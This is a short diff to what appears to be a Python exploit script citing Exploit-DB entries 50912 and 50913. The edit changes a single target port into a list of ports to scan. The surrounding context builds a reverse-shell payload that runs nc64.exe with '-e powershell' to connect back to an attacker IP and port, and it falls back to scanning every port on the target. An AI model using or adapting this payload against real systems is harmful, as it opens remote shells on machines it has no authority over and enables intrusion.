@@ -14,7 +14,7 @@ except Exception as ex:
 reverse_shell_ip = "10.1.1.21"
 reverse_shell_port = 1038
 target_ip = "10.1.1.10"
-target_port = 5040 # optional, if not sure just set to -1
+target_ports = [1002, 1032] # optional, if not sure just set to []
 
 ncat_dir = "C:\\Temp\\nc64.exe"
 payload = f"{ncat_dir} {reverse_shell_ip} {reverse_shell_port} -e powershell"
@@ -32,8 +32,8 @@ https://github.com/i-vt
 https://www.exploit-db.com/exploits/50912
 https://www.exploit-db.com/exploits/50913
 """
-if target_port not in ["-1", -1]: 
-    ports_to_scan = [target_port]
+if target_ports != []: 
+    ports_to_scan = target_ports
 else: 
     ports_to_scan = list(range(0,65500))
     if reverse_shell_ip == target_ip or reverse_shell_ip in ["127.0.0.1", "::1"]:
